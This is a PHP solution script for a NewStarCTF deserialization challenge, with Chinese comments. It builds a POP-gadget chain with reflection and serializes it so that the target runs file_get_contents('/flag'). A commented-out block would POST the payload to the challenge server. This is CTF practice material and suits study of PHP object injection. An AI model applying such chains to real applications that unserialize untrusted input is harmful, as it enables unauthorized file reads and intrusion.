<?php
class Start
{
    public $name;
    protected $func;
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, " . $this->name;
    }
    public function __isset($var)
    {
        ($this->func)();
    }
}
class Sec
{
    private $obj;
    private $var;
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
    public function __invoke()
    {
        echo file_get_contents("/flag");
    }
}
class Easy
{
    public $cla;
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
class eeee
{
    public $obj;
    public function __clone()
    {
        if (isset($this->obj->cmd)) {
            echo "success\n";
        }
    }
}

function setProp($obj, $prop, $value)
{
    $ref = new ReflectionClass($obj);
    $p = $ref->getProperty($prop);
    $p->setAccessible(true);
    $p->setValue($obj, $value);
}

$a = new Start();

$sec = new Sec();
setProp($sec, "obj", new Easy());
setProp($sec, "var", new eeee());
$a->name = $sec;

$inner = new Start();
setProp($inner, "func", new Sec());
// eeee实例存在 $a->name 的 private $var 里，怎么给它$obj赋值？

// 方案：先把eeee对象造好再塞进去
$e = new eeee();
$e->obj = $inner; // public，直接赋 ✅
setProp($sec, "var", $e); // 再整体塞回private属性

// echo urlencode(serialize($a)) . "\n\n";
echo serialize($a) . "\n\n";

// unserialize(serialize($a));    // 本地验证

// ============ 直接发包（无需curl扩展）============
// $url = 'http://ab6115072eb9f3fbec444493.http-ctf2.dasctf.com/';

// $context = stream_context_create([
//     'http' => [
//         'method'  => 'POST',
//         'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
//         'content' => http_build_query(['pop' => serialize($a)]),  // 自动正确编码%00
//         'ignore_errors' => true,   // 4xx/5xx也读取响应内容
//     ]
// ]);

// $resp = file_get_contents($url, false, $context);
// echo "=== 服务器响应 ===\n" . $resp . "\n";
